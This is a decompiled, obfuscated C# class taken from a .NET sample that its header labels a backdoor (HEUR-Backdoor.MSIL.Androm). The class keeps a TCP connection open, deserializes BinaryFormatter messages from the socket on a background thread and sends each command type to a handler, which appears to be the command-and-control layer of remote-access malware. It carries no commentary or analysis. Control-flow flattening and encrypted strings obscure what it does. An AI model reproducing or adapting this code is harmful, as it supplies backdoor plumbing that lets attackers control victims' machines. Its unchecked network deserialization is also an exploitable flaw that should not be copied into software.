// Decompiled with JetBrains decompiler
// Type: InvalidOleVariantTypeExcept.Identifiers.WriterFieldID
// Assembly: InvalidOleVariantTypeExcept, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 9E82E8E9-C8CD-41F7-BA61-2A9379AE4148
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Backdoor.MSIL.Androm.gen-02b77b24d467552510c0f56dbde53c82e4e932dcaeb0e08fcfec00d4c359a9b9.exe

using InvalidOleVariantTypeExcept.Filters;
using InvalidOleVariantTypeExcept.Messages;
using InvalidOleVariantTypeExcept.Watchers;
using System;
using System.Collections.Generic;
using System.IO;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Runtime.Serialization;
using System.Runtime.Serialization.Formatters.Binary;
using System.Threading;
using TGL.Consumers;
using TGL.Licensing;
using TGL.Polices;

namespace InvalidOleVariantTypeExcept.Identifiers
{
  public abstract class WriterFieldID : DicComparatorConsumer
  {
    private PoolFieldMessage _Dispatcher;
    private PoolFieldMessage m_Role;
    private List<PoolFieldMessage> adapter;
    private Thread m_Object;
    private TcpClient pool;
    private IFormatter decorator;
    private CancellationTokenSource @class;
    private readonly object serializer;
    public WriterFieldID.WorkerStrategyConnector m_Indexer;
    public WriterFieldID.DecoratorFieldMessage proxy;
    public WriterFieldID.ErrorStubPolicy _Model;
    public WriterFieldID.CandidateVisitorConfig item;
    public WriterFieldID.StructPrototypeStub merchant;
    public WriterFieldID.ClassFieldMessage m_Interceptor;

    [MethodImpl(MethodImplOptions.NoInlining)]
    public WriterFieldID(TcpClient asset)
    {
      int num1 = 6;
      while (true)
      {
        int num2 = num1;
        while (true)
        {
          switch (num2)
          {
            case 0:
              this.adapter = new List<PoolFieldMessage>();
              num2 = 5;
              continue;
            case 1:
              this.decorator = (IFormatter) new BinaryFormatter();
              num2 = 7;
              continue;
            case 2:
            case 4:
              goto label_6;
            case 3:
            case 8:
              goto label_7;
            case 5:
              goto label_5;
            case 6:
              UtilsContextLicense.ListWorker();
              num2 = 0;
              continue;
            case 7:
              goto label_3;
            case 9:
              goto label_11;
            default:
              goto label_10;
          }
        }
label_3:
        this._Dispatcher = new PoolFieldMessage(RoleValueFilter.RestartVisitor(728));
        num1 = 9;
        continue;
label_5:
        this.serializer = new object();
        num1 = 8;
        continue;
label_6:
        this.pool = asset;
        num1 = 1;
        continue;
label_7:
        // ISSUE: explicit constructor call
        base.\u002Ector();
        goto label_6;
label_10:
        num1 = 2;
      }
label_11:;
    }

    [SpecialName]
    [MethodImpl(MethodImplOptions.NoInlining)]
    public List<PoolFieldMessage> InitRecord() => this.adapter;

    [SpecialName]
    [MethodImpl(MethodImplOptions.NoInlining)]
    public PoolFieldMessage ReadRecord() => this._Dispatcher;

    [SpecialName]
    [MethodImpl(MethodImplOptions.NoInlining)]
    public void CountRecord(PoolFieldMessage var1) => this._Dispatcher = var1;

    [SpecialName]
    [MethodImpl(MethodImplOptions.NoInlining)]
    public PoolFieldMessage RateRecord() => this.m_Role;

    [SpecialName]
    [MethodImpl(MethodImplOptions.NoInlining)]
    public void RemoveRecord(PoolFieldMessage first) => this.m_Role = first;

    [MethodImpl(MethodImplOptions.NoInlining)]
    public bool WriteRecord() => !this._Dispatcher.StartRecord().StartsWith(RoleValueFilter.RestartVisitor(728));

    [MethodImpl(MethodImplOptions.NoInlining)]
    public bool InterruptRecord() => this.@class != null && !this.@class.IsCancellationRequested;

    [MethodImpl(MethodImplOptions.NoInlining)]
    public void PushRecord()
    {
      try
      {
        lock (this.serializer)
        {
          int num1 = 5;
          while (true)
          {
            int num2 = num1;
            while (true)
            {
              switch (num2)
              {
                case 0:
                  this.m_Object.Start();
                  num2 = 2;
                  continue;
                case 1:
                  goto label_7;
                case 2:
                  goto label_18;
                case 3:
                case 6:
                  goto label_3;
                case 4:
                case 8:
                  goto label_11;
                case 5:
                  goto label_9;
                case 7:
                  goto label_12;
                case 9:
                  goto label_20;
                default:
                  if (WriterFieldID.ComputeInfo())
                  {
                    num2 = 8;
                    continue;
                  }
                  goto label_7;
              }
            }
label_3:
            this.@class = new CancellationTokenSource();
            goto label_11;
label_7:
            if (this.m_Object != null)
            {
              num1 = 7;
              continue;
            }
            int num3 = 1;
            goto label_15;
label_9:
            if (this.pool != null)
            {
              num1 = 1;
              continue;
            }
            num3 = 0;
            goto label_15;
label_11:
            this.m_Object = new Thread((ThreadStart) (() => this.CallRecord(this.@class.Token)))
            {
              IsBackground = true
            };
            num1 = 0;
            continue;
label_12:
            num3 = !this.m_Object.IsAlive ? 1 : 0;
label_15:
            if (num3 != 0)
            {
              num1 = 6;
            }
            else
            {
              this.log((BehaviorAccumulateValues) 1, RoleValueFilter.RestartVisitor(74));
              num1 = 9;
            }
          }
label_18:
          return;
label_20:;
        }
      }
      catch (Exception ex)
      {
        this.log((BehaviorAccumulateValues) 2, RoleValueFilter.RestartVisitor(750) + ex.Message);
      }
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    public void FillRecord()
    {
      try
      {
        if (!this.pool.Connected || this.m_Object == null || !this.m_Object.IsAlive)
          return;
        lock (this.serializer)
        {
          int num1 = 2;
          if (true)
            goto label_6;
label_4:
          this.pool.Close();
          goto label_9;
label_5:
          int num2;
          num1 = num2;
label_6:
          while (true)
          {
            switch (num1)
            {
              case 0:
              case 2:
                goto label_8;
              case 1:
              case 4:
                goto label_4;
              case 3:
                goto label_9;
              case 5:
                goto label_14;
              default:
                if (true)
                {
                  num1 = 3;
                  continue;
                }
                goto label_8;
            }
          }
label_8:
          this.@class.Cancel();
          num2 = 4;
          goto label_5;
label_9:
          this.log((BehaviorAccumulateValues) 0, RoleValueFilter.RestartVisitor(248));
          num2 = 5;
          goto label_5;
        }
label_14:;
      }
      catch (Exception ex)
      {
        this.log((BehaviorAccumulateValues) 2, RoleValueFilter.RestartVisitor(778) + ex.Message);
      }
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    public void log(BehaviorAccumulateValues info, string result) => this.merchant(new KeyValuePair<BehaviorAccumulateValues, string>(info, RoleValueFilter.RestartVisitor(806) + this._Dispatcher.StartRecord() + RoleValueFilter.RestartVisitor(322) + result));

    [MethodImpl(MethodImplOptions.NoInlining)]
    public void SortRecord(Identifier ident)
    {
      try
      {
        this.decorator.Serialize((Stream) this.pool.GetStream(), (object) ident);
      }
      catch (Exception ex)
      {
        this.log((BehaviorAccumulateValues) 2, RoleValueFilter.RestartVisitor(824) + ex.Message);
      }
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    public void CallRecord(CancellationToken task)
    {
      int num1 = 3;
      while (true)
      {
        int num2;
        switch (num1)
        {
          case 0:
          case 3:
label_22:
            if (this.pool.Connected)
            {
              int num3 = 2;
              num1 = WriterFieldID.SetInfo() ? num3 : num3;
              continue;
            }
            num2 = 0;
            break;
          case 1:
          case 2:
            num2 = !task.IsCancellationRequested ? 1 : 0;
            break;
          case 4:
            goto label_28;
          default:
            num1 = 4;
            continue;
        }
        if (num2 != 0)
        {
          try
          {
            Identifier identifier = (Identifier) this.decorator.Deserialize((Stream) this.pool.GetStream());
            int num4 = 3;
            while (true)
            {
              int num5 = num4;
              ItemValues itemValues1;
              while (true)
              {
                switch (num5)
                {
                  case 0:
                  case 2:
                  case 4:
                  case 6:
                  case 8:
                  case 11:
                  case 12:
                    goto label_21;
                  case 1:
                    goto label_12;
                  case 3:
                    goto label_2;
                  case 5:
                    if (itemValues1 == (ItemValues) 15)
                    {
                      this.proxy(this, identifier);
                      if (true)
                      {
                        num5 = 2;
                        continue;
                      }
                      goto label_21;
                    }
                    else
                      goto label_13;
                  case 7:
                    goto label_13;
                  case 9:
                    goto label_14;
                  case 10:
                    if (itemValues1 == (ItemValues) 14)
                    {
                      this.m_Indexer(this, identifier);
                      if (WriterFieldID.ComputeInfo())
                      {
                        num5 = 11;
                        continue;
                      }
                      goto label_21;
                    }
                    else
                      goto label_9;
                  default:
                    goto label_6;
                }
              }
label_2:
              ItemValues itemValues2 = identifier.CreateRecord();
              num4 = 1;
              continue;
label_6:
              num4 = 7;
              continue;
label_9:
              num4 = 5;
              continue;
label_12:
              itemValues1 = itemValues2;
              num4 = 9;
              continue;
label_13:
              this.GetResolver(identifier);
              num4 = 12;
              continue;
label_14:
              switch (itemValues1)
              {
                case (ItemValues) 4:
                  this.DestroyRecord();
                  num4 = 4;
                  continue;
                case (ItemValues) 5:
                  this._Model(this, identifier);
                  num4 = 0;
                  continue;
                case (ItemValues) 6:
                  goto label_17;
                default:
                  num4 = 10;
                  continue;
              }
            }
label_17:
            this.item(this, identifier);
          }
          catch (Exception ex)
          {
            if (!task.IsCancellationRequested)
              this.DestroyRecord();
          }
label_21:
          goto label_22;
        }
        else
          break;
      }
      return;
label_28:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    public void DestroyRecord()
    {
      this.FillRecord();
      this.m_Interceptor(this);
    }

    public abstract void GetResolver(Identifier info);

    internal static bool ComputeInfo() => true;

    internal static bool SetInfo() => false;

    public delegate void WorkerStrategyConnector(WriterFieldID ut, Identifier msg);

    public delegate void DecoratorFieldMessage(WriterFieldID ut, Identifier msg);

    public delegate void ErrorStubPolicy(WriterFieldID ut, Identifier msg);

    public delegate void CandidateVisitorConfig(WriterFieldID ut, Identifier msg);

    public delegate void ClassFieldMessage(WriterFieldID ut);

    public delegate void StructPrototypeStub(KeyValuePair<BehaviorAccumulateValues, string> msg);
  }
}
